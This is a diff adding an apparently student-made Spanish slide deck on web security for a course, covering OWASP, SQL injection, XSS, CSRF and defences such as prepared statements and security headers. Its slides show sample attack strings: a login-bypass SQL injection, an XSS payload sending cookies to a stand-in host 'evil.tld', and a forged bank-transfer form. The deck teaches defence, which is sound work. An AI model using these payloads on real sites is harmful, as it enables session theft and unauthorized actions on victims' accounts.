@@ -1,11 +1,555 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <meta name="description" content="Presentación: Seguridad en Aplicaciones Web - Tópicos Selectos de Programación Web">
+    <title>Seguridad Web · Tópicos Selectos de Programación Web</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css?v=1.1">
 </head>
 <body>
-    
+
+    <!-- Barra de progreso superior -->
+    <div class="progress-bar" aria-hidden="true">
+        <div class="progress-bar__fill" id="progressFill"></div>
+    </div>
+
+    <!-- Marca / logo de la materia -->
+    <header class="topbar">
+        <span class="topbar__brand"><span class="dot-live"></span> Tópicos Selectos de Programación Web</span>
+        <span class="topbar__counter" id="slideCounter">01 / 10</span>
+    </header>
+
+    <!-- Contenedor principal de diapositivas -->
+    <main class="deck" id="deck">
+
+        <!-- ═══════════ DIAP 1 · PORTADA ═══════════ -->
+        <section class="slide slide--active" data-slide="1" aria-label="Portada">
+            <div class="slide__inner slide__inner--center">
+                <p class="kicker">Materia · Tópicos Selectos de Programación Web</p>
+                <h1 class="hero-title">
+                    Seguridad <span class="text-gradient">Web</span>
+                </h1>
+                <p class="hero-sub">
+                    Vulnerabilidades convencionales, técnicas de explotación
+                    y programación segura.
+                </p>
+
+                <div class="hero-tags">
+                    <span class="tag">4.2 Vulnerabilidades</span>
+                    <span class="tag">4.3 Programación Segura</span>
+                    <span class="tag">OWASP Top 10</span>
+                </div>
+
+                <div class="authors">
+                    <span class="authors__label">Expositores</span>
+                    <div class="authors__grid">
+                        <div class="author-card">
+                            <div class="author-card__avatar">01</div>
+                            <div class="author-card__info">
+                                <strong>Hernánez Yonemoto Jorge Gonzalo</strong>
+                                <span>Ingeniería en Sistemas Computacionales · Grupo S7V</span>
+                                <span class="mono">Profesora: Acevedo Calderón Orquídea</span>
+                            </div>
+                        </div>
+                        <div class="author-card">
+                            <div class="author-card__avatar">02</div>
+                            <div class="author-card__info">
+                                <strong>Nombre del expositor 2</strong>
+                                <span>Ingeniería de Software · Grupo 00X</span>
+                                <span class="mono">matrícula · correo</span>
+                            </div>
+                        </div>
+                        <div class="author-card">
+                            <div class="author-card__avatar">03</div>
+                            <div class="author-card__info">
+                                <strong>Nombre del expositor 3</strong>
+                                <span>Ingeniería de Software · Grupo 00X</span>
+                                <span class="mono">matrícula · correo</span>
+                            </div>
+                        </div>
+                        <div class="author-card">
+                            <div class="author-card__avatar">04</div>
+                            <div class="author-card__info">
+                                <strong>Nombre del expositor 4</strong>
+                                <span>Ingeniería de Software · Grupo 00X</span>
+                                <span class="mono">matrícula · correo</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <p class="hint">
+                    <kbd>←</kbd> <kbd>→</kbd> o desliza para navegar
+                </p>
+            </div>
+        </section>
+
+        <!-- ═══════════ DIAP 2 · INTRODUCCIÓN + CIA ═══════════ -->
+        <section class="slide" data-slide="2" aria-label="Introducción a la Seguridad Web" hidden>
+            <div class="slide__inner">
+                <p class="kicker">Introducción</p>
+                <h2 class="slide-title">¿Por qué es crucial la seguridad web?</h2>
+
+                <div class="grid grid--2">
+                    <div class="card">
+                        <h3 class="card__title">El escenario actual</h3>
+                        <ul class="list">
+                            <li>Las aplicaciones web son el <strong>principal vector de entrada</strong> a las organizaciones.</li>
+                            <li>Un solo fallo puede filtrar datos de <strong>millones de usuarios</strong> en segundos.</li>
+                            <li>El costo de corregir un bug en producción es <strong>100× mayor</strong> que en diseño.</li>
+                            <li>La seguridad ya no es optativa: es un <strong>requisito funcional</strong>.</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3 class="card__title">El triángulo CIA</h3>
+                        <div class="cia">
+                            <div class="cia__item">
+                                <span class="cia__letter">C</span>
+                                <div>
+                                    <strong>Confidencialidad</strong>
+                                    <p>Solo quien está autorizado accede a la información.</p>
+                                </div>
+                            </div>
+                            <div class="cia__item">
+                                <span class="cia__letter">I</span>
+                                <div>
+                                    <strong>Integridad</strong>
+                                    <p>Los datos no son alterados de forma no autorizada.</p>
+                                </div>
+                            </div>
+                            <div class="cia__item">
+                                <span class="cia__letter">A</span>
+                                <div>
+                                    <strong>Disponibilidad</strong>
+                                    <p>El sistema está accesible cuando se necesita.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══════════ DIAP 3 · OWASP ═══════════ -->
+        <section class="slide" data-slide="3" aria-label="Vulnerabilidades convencionales - OWASP" hidden>
+            <div class="slide__inner">
+                <p class="kicker kicker--warn">4.2 · Vulnerabilidades convencionales y técnicas de explotación</p>
+                <h2 class="slide-title">Vulnerabilidades convencionales · Panorama OWASP</h2>
+
+                <div class="grid grid--2">
+                    <div class="card">
+                        <h3 class="card__title">¿Qué es una vulnerabilidad?</h3>
+                        <p class="text">
+                            Debilidad en el diseño, la implementación o la operación de una
+                            aplicación que un atacante puede <strong>explotar</strong> para
+                            alterar el comportamiento esperado del sistema.
+                        </p>
+                        <div class="callout">
+                            <span class="callout__label">OWASP Top 10</span>
+                            Estándar abierto que documenta los <strong>10 riesgos de seguridad
+                            críticos</strong> en aplicaciones web, actualizado periódicamente
+                            por la comunidad.
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <h3 class="card__title">Superficie de ataque</h3>
+                        <p class="text">Todo punto donde el usuario interactúa con la aplicación:</p>
+                        <div class="surface">
+                            <span class="chip">Formularios</span>
+                            <span class="chip">APIs / endpoints</span>
+                            <span class="chip">Cookies y tokens</span>
+                            <span class="chip">Cabeceras HTTP</span>
+                            <span class="chip">Archivos subidos</span>
+                            <span class="chip">Parámetros URL</span>
+                            <span class="chip">WebSockets</span>
+                            <span class="chip">Servicios de terceros</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="owasp-strip">
+                    <span class="owasp-strip__item">A01 Broken Access Control</span>
+                    <span class="owasp-strip__item">A02 Cryptographic Failures</span>
+                    <span class="owasp-strip__item">A03 Injection</span>
+                    <span class="owasp-strip__item">A04 Insecure Design</span>
+                    <span class="owasp-strip__item">A05 Security Misconfig</span>
+                    <span class="owasp-strip__item">A07 Auth Failures</span>
+                    <span class="owasp-strip__item">A08 Data Integrity</span>
+                    <span class="owasp-strip__item">A09 Logging Failures</span>
+                    <span class="owasp-strip__item">A10 SSRF</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══════════ DIAP 4 · SQLi ═══════════ -->
+        <section class="slide" data-slide="4" aria-label="Inyección SQL" hidden>
+            <div class="slide__inner">
+                <p class="kicker kicker--danger">Técnicas de explotación</p>
+                <h2 class="slide-title">Inyección SQL <span class="text-muted">(SQLi)</span></h2>
+
+                <div class="grid grid--2">
+                    <div class="card">
+                        <h3 class="card__title">Cómo opera</h3>
+                        <ol class="steps">
+                            <li>El atacante inserta <strong>SQL malicioso</strong> en una entrada de datos.</li>
+                            <li>La consulta se concatena sin sanitizar → el motor <strong>ejecuta instrucciones extra</strong>.</li>
+                            <li>Resultado: <strong>bypass de autenticación</strong>, lectura o borrado de la BD, toma de control.</li>
+                        </ol>
+                        <div class="callout callout--danger">
+                            <span class="callout__label">Impacto</span>
+                            Exfiltración masiva de datos, elusión de login y, en sistemas
+                            mal configurados, ejecución de comandos en el servidor.
+                        </div>
+                    </div>
+
+                    <div class="card card--code">
+                        <h3 class="card__title">Código vulnerable</h3>
+<pre class="code"><code><span class="c-com">// Vulnerable: concatenación directa</span>
+<span class="c-kw">const</span> q = <span class="c-str">`SELECT * FROM users
+  WHERE user = '<span class="c-bad">${user}</span>'
+    AND pass = '<span class="c-bad">${pass}</span>'`</span>;</code></pre>
+                        <h3 class="card__title card__title--spaced">Vector de ataque</h3>
+<pre class="code code--attack"><code>user: <span class="c-bad">admin' OR '1'='1' --</span>
+pass: <span class="c-bad">(cualquiera)</span>
+
+<span class="c-com">// SQL resultante:</span>
+<span class="c-bad">SELECT * FROM users WHERE user='admin'
+  OR '1'='1' --' AND pass='...'</span></code></pre>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══════════ DIAP 5 · XSS ═══════════ -->
+        <section class="slide" data-slide="5" aria-label="Cross-Site Scripting" hidden>
+            <div class="slide__inner">
+                <p class="kicker kicker--danger">Técnicas de explotación</p>
+                <h2 class="slide-title">Cross-Site Scripting <span class="text-muted">(XSS)</span></h2>
+
+                <div class="grid grid--3">
+                    <div class="card card--accent">
+                        <span class="badge">01</span>
+                        <h3 class="card__title">Reflejado</h3>
+                        <p class="text">El payload viaja en la URL y se <strong>devuelve sin filtrar</strong> en la respuesta (p. ej. en un error o buscador).</p>
+                        <p class="mono small">Ej: <span class="c-bad">?q=&lt;script&gt;…</span></p>
+                    </div>
+
+                    <div class="card card--accent">
+                        <span class="badge">02</span>
+                        <h3 class="card__title">Persistente (Stored)</h3>
+                        <p class="text">El script queda <strong>guardado en la BD</strong> (comentarios, perfil) y se ejecuta para <strong>todos</strong> que lo visitan.</p>
+                        <p class="mono small">Mayor alcance y gravedad</p>
+                    </div>
+
+                    <div class="card card--accent">
+                        <span class="badge">03</span>
+                        <h3 class="card__title">DOM-based</h3>
+                        <p class="text">El fallo ocurre <strong>100% en el cliente</strong>: el JS manipula el DOM con datos de la URL sin pasar por el servidor.</p>
+                        <p class="mono small">Ej: <span class="c-bad">innerHTML = location.hash</span></p>
+                    </div>
+                </div>
+
+                <div class="grid grid--2">
+                    <div class="card">
+                        <h3 class="card__title">Impacto directo</h3>
+                        <ul class="list">
+                            <li><strong>Robo de cookies y tokens de sesión</strong> (session hijacking).</li>
+                            <li>Suplantación de identidad y acciones en nombre de la víctima.</li>
+                            <li>Redirección a sitios falsos (phishing) dentro del dominio de confianza.</li>
+                            <li>Keylogging y modificación del contenido mostrado.</li>
+                        </ul>
+                    </div>
+                    <div class="card card--code">
+                        <h3 class="card__title">Ejemplo de payload</h3>
+<pre class="code code--attack"><code>&lt;script&gt;
+  document.location=
+  <span class="c-bad">'https://evil.tld/steal?c='
+  + document.cookie</span>
+&lt;/script&gt;</code></pre>
+                        <p class="text small">Con <span class="mono">HttpOnly</span> en la cookie, el robo directo falla → defensa en profundidad.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══════════ DIAP 6 · CSRF ═══════════ -->
+        <section class="slide" data-slide="6" aria-label="CSRF y otras amenazas" hidden>
+            <div class="slide__inner">
+                <p class="kicker kicker--danger">Técnicas de explotación</p>
+                <h2 class="slide-title">CSRF y otras amenazas</h2>
+
+                <div class="grid grid--2">
+                    <div class="card">
+                        <h3 class="card__title">Cross-Site Request Forgery</h3>
+                        <p class="text">
+                            El navegador envía <strong>automáticamente las cookies</strong> de
+                            un sitio a cualquier petición que salga hacia él. Si un atacante
+                            logra que tu navegador haga una petición a tu banco, esa petición
+                            <strong>parece legítima</strong>.
+                        </p>
+                        <ol class="steps">
+                            <li>Estás logeado en <span class="mono">banco.com</span>.</li>
+                            <li>Visitas un sitio malicioso con un <span class="mono">&lt;img&gt;</span> o form oculto.</li>
+                            <li>El navegador ejecuta <span class="mono">POST /transferir</span> <strong>con tu cookie</strong>.</li>
+                            <li>La transferencia se realiza sin que lo sepas.</li>
+                        </ol>
+<pre class="code code--attack"><code>&lt;form action=<span class="c-bad">"https://banco.com/transferir"</span> method=<span class="c-str">"POST"</span>&gt;
+  &lt;input name=<span class="c-str">"destino"</span> value=<span class="c-bad">"atacante"</span>&gt;
+  &lt;input name=<span class="c-str">"monto"</span> value=<span class="c-bad">"10000"</span>&gt;
+&lt;/form&gt;</code></pre>
+                    </div>
+
+                    <div>
+                        <div class="card">
+                            <h3 class="card__title">Otras amenazas frecuentes</h3>
+                            <ul class="threats">
+                                <li>
+                                    <strong>Exposición de datos sensibles</strong>
+                                    <span>Tokens en URLs, errores con stack trace, claves en el repositorio, datos sin cifrar (HTTP).</span>
+                                </li>
+                                <li>
+                                    <strong>Control de acceso roto (IDOR / Broken Access)</strong>
+                                    <span>Modificar <span class="mono">?id=123</span> para ver o editar recursos de otro usuario porque no hay autorización en servidor.</span>
+                                </li>
+                                <li>
+                                    <strong>Fallas de autenticación</strong>
+                                    <span>Contraseñas débiles, falta de rate-limit y sesiones que no expiran.</span>
+                                </li>
+                                <li>
+                                    <strong>Vulnerabilidades de componentes</strong>
+                                    <span>Librerías con CVE conocidos y sin actualizar.</span>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══════════ DIAP 7 · SEGURIDAD POR DISEÑO ═══════════ -->
+        <section class="slide" data-slide="7" aria-label="Programación segura" hidden>
+            <div class="slide__inner">
+                <p class="kicker kicker--ok">4.3 · Programación segura</p>
+                <h2 class="slide-title">Introducción a la Programación Segura</h2>
+
+                <div class="grid grid--2">
+                    <div class="card card--highlight">
+                        <h3 class="card__title">Security by Design</h3>
+                        <p class="text">
+                            Cambio de paradigma: la seguridad <strong>no es una capa que se
+                            agrega al final</strong>, sino una propiedad que se diseña desde
+                            la primera línea de código.
+                        </p>
+                        <div class="compare">
+                            <div class="compare__col compare__col--bad">
+                                <span class="compare__label">Antes</span>
+                                <p>Codificar → testear → parchear vulnerabilidades en producción.</p>
+                            </div>
+                            <div class="compare__col compare__col--good">
+                                <span class="compare__label">Ahora</span>
+                                <p>Modelar amenazas → diseño seguro → implementar → verificar continuamente.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <h3 class="card__title">Principio de Menor Privilegio</h3>
+                        <p class="text">
+                            Cada usuario, proceso y componente recibe
+                            <strong>solo los permisos estrictamente necesarios</strong>
+                            para su función, y solo durante el tiempo que los necesite.
+                        </p>
+                        <ul class="list">
+                            <li>Usuario sin permisos de administrador → no puede borrar la BD.</li>
+                            <li>App conectada con cuenta <span class="mono">SELECT-only</span> → un SQLi no borra tablas.</li>
+                            <li>Sesión de corta duración con expiración y rotación.</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="principles">
+                    <span class="principle">Defensa en profundidad</span>
+                    <span class="principle">Fallar de forma segura</span>
+                    <span class="principle">Separación de componentes</span>
+                    <span class="principle">Mínima sorpresa</span>
+                    <span class="principle">Keep it simple</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══════════ DIAP 8 · VALIDACIÓN Y SANITIZACIÓN ═══════════ -->
+        <section class="slide" data-slide="8" aria-label="Validación y sanitización" hidden>
+            <div class="slide__inner">
+                <p class="kicker kicker--ok">4.3 · Mitigación</p>
+                <h2 class="slide-title">Validación y Sanitización de entradas</h2>
+
+                <div class="grid grid--2">
+                    <div class="card card--accent">
+                        <h3 class="card__title"><span class="pill pill--good">✓</span> Whitelisting (lista blanca)</h3>
+                        <p class="text">Definir lo que <strong>SÍ</strong> está permitido. Todo lo demás se rechaza.</p>
+<pre class="code"><code><span class="c-com">// Solo dígitos, 10 posiciones</span>
+<span class="c-kw">if</span> (!<span class="c-fn">/^\d{10}$/.test</span>(tel)) <span class="c-kw">throw</span> <span class="c-kw">new</span> <span class="c-fn">Error</span>(<span class="c-str">"Teléfono inválido"</span>);
+
+<span class="c-com">// Solo roles conocidos</span>
+<span class="c-kw">if</span> (!ROLES.<span class="c-fn">includes</span>(rol)) rol = <span class="c-str">"guest"</span>;</code></pre>
+                        <p class="text small ok">✅ Recomendado: predecible, auditable, imposible de "evadir con creatividad".</p>
+                    </div>
+
+                    <div class="card card--accent">
+                        <h3 class="card__title"><span class="pill pill--bad">✗</span> Blacklisting (lista negra)</h3>
+                        <p class="text">Bloquear lo que se considera <strong>malo</strong>. Cualquier patrón nuevo lo elude.</p>
+<pre class="code code--attack"><code><span class="c-com">// Frágil: se salta con mayúsculas,</span>
+<span class="c-com">// comentarios SQL, codificación, doble codificación…</span>
+<span class="c-kw">if</span> (input.<span class="c-fn">includes</span>(<span class="c-str">"SELECT"</span>) ||
+    input.<span class="c-fn">includes</span>(<span class="c-str">"&lt;script&gt;"</span>)) <span class="c-kw">return</span> <span class="c-kw">null</span>;</code></pre>
+                        <p class="text small danger">✗ Selek/SeLeCt, <span class="mono">&lt;SCRIPT&gt;</span>, <span class="mono">%3Cscript%</span> → evasión garantizada.</p>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3 class="card__title">Sanitización y escape según el contexto</h3>
+                    <div class="grid grid--3">
+                        <div class="mini">
+                            <span class="mini__ctx">HTML</span>
+                            <p>Escapar <span class="mono">&amp; &lt; &gt; " '</span> antes de insertar en el DOM.</p>
+                        </div>
+                        <div class="mini">
+                            <span class="mini__ctx">SQL</span>
+                            <p>Usar consultas preparadas; nunca concatenar entrada del usuario.</p>
+                        </div>
+                        <div class="mini">
+                            <span class="mini__ctx">URL / JS / Shell</span>
+                            <p>Codificar con las funciones del contexto específico, no una genérica.</p>
+                        </div>
+                    </div>
+                    <p class="text small">Regla de oro: <strong>validar en la entrada, escapar en la salida</strong> y validar otra vez en el servidor (nunca confiar solo en el cliente).</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══════════ DIAP 9 · DEFENSAS TÉCNICAS ═══════════ -->
+        <section class="slide" data-slide="9" aria-label="Defensas y cabeceras HTTP" hidden>
+            <div class="slide__inner">
+                <p class="kicker kicker--ok">4.3 · Defensas técnicas</p>
+                <h2 class="slide-title">Consultas preparadas y cabeceras HTTP</h2>
+
+                <div class="grid grid--2">
+                    <div class="card card--code">
+                        <h3 class="card__title">Prepared Statements vs. concatenación</h3>
+<pre class="code"><code><span class="c-com">// ✗ Vulnerable</span>
+db.<span class="c-fn">query</span>(<span class="c-str">`SELECT * FROM users
+   WHERE user = '${user}'`</span>);
+
+<span class="c-com">// ✓ Seguro: parámetros separados del SQL</span>
+db.<span class="c-fn">query</span>(<span class="c-str">`SELECT * FROM users
+   WHERE user = ?`</span>, [user]);
+
+<span class="c-com">// ✓ ORM con binding tipado</span>
+User.<span class="c-fn">findOne</span>({ where: { user } });</code></pre>
+                        <p class="text small">El motor recibe la consulta y los datos <strong>por separado</strong>: el input jamás se interpreta como código SQL. Es la defensa nº1 contra SQLi (y aplica a NoSQL e XPath).</p>
+                    </div>
+
+                    <div class="card">
+                        <h3 class="card__title">Cabeceras HTTP clave</h3>
+                        <table class="headers-table">
+                            <thead>
+                                <tr><th>Cabecera</th><th>Protege contra</th></tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td class="mono">Content-Security-Policy</td>
+                                    <td>XSS, carga de scripts externos, clickjacking</td>
+                                </tr>
+                                <tr>
+                                    <td class="mono">X-Frame-Options / frame-ancestors</td>
+                                    <td>Clickjacking (iframes maliciosos)</td>
+                                </tr>
+                                <tr>
+                                    <td class="mono">Strict-Transport-Security</td>
+                                    <td>Downgrade a HTTP, ataques Man-in-the-Middle</td>
+                                </tr>
+                                <tr>
+                                    <td class="mono">X-Content-Type-Options: nosniff</td>
+                                    <td>Mime-sniffing y ejecución de archivos no esperados</td>
+                                </tr>
+                                <tr>
+                                    <td class="mono">Set-Cookie: HttpOnly; Secure; SameSite</td>
+                                    <td>Robo de cookies por XSS y CSRF</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+<pre class="code code--full"><code><span class="c-com"># Ejemplo de respuesta del servidor</span>
+<span class="c-fn">Content-Security-Policy</span>: default-src 'self'; script-src 'self'
+<span class="c-fn">X-Frame-Options</span>: DENY
+<span class="c-fn">Strict-Transport-Security</span>: max-age=31536000; includeSubDomains
+<span class="c-fn">X-Content-Type-Options</span>: nosniff</code></pre>
+            </div>
+        </section>
+
+        <!-- ═══════════ DIAP 10 · CONCLUSIONES ═══════════ -->
+        <section class="slide" data-slide="10" aria-label="Conclusiones" hidden>
+            <div class="slide__inner slide__inner--center">
+                <p class="kicker">Cierre</p>
+                <h2 class="slide-title">Conclusiones y buenas prácticas</h2>
+
+                <div class="grid grid--3 conclusions">
+                    <div class="card card--mini">
+                        <span class="card__icon">🛡️</span>
+                        <h3 class="card__title">Prevención</h3>
+                        <p class="text">Valida, escapa y usa consultas preparadas. <strong>Nunca</strong> concatenes entradas del usuario.</p>
+                    </div>
+                    <div class="card card--mini">
+                        <span class="card__icon">🔐</span>
+                        <h3 class="card__title">Defensa en profundidad</h3>
+                        <p class="text">CSP, cookies <span class="mono">HttpOnly/SameSite</span>, HSTS, menor privilegio y sesiones robustas.</p>
+                    </div>
+                    <div class="card card--mini">
+                        <span class="card__icon">👤</span>
+                        <h3 class="card__title">Responsabilidad full-stack</h3>
+                        <p class="text">Seguridad en diseño, código, dependencias, despliegue y respuesta a incidentes.</p>
+                    </div>
+                </div>
+
+                <div class="callout callout--wide">
+                    <span class="callout__label">Mensajes clave</span>
+                    <div class="keypoints">
+                        <span>✓ Seguridad <strong>desde el diseño</strong>, no al final</span>
+                        <span>✓ Toda entrada es <strong>hostil</strong> hasta demostrar lo contrario</span>
+                        <span>✓ Escapar <strong>según el contexto</strong> en cada salida</span>
+                        <span>✓ Menor privilegio y <strong>defensa en profundidad</strong></span>
+                        <span>✓ Mantener <strong>actualizadas</strong> librerías y configuraciones</span>
+                    </div>
+                </div>
+
+                <h3 class="thanks">¡Gracias! <span class="text-gradient">¿Preguntas?</span></h3>
+                <p class="hint">Espacio para preguntas y discusión</p>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Controles de navegación -->
+    <nav class="controls" aria-label="Navegación de diapositivas">
+        <button class="ctrl-btn" id="prevBtn" aria-label="Diapositiva anterior" title="Anterior (←)">
+            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+        </button>
+
+        <div class="dots" id="dots" role="tablist" aria-label="Indicadores de diapositiva"></div>
+
+        <button class="ctrl-btn" id="nextBtn" aria-label="Diapositiva siguiente" title="Siguiente (→)">
+            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+        </button>
+    </nav>
+
+    <script src="app.js?v=1.1"></script>
 </body>
 </html>
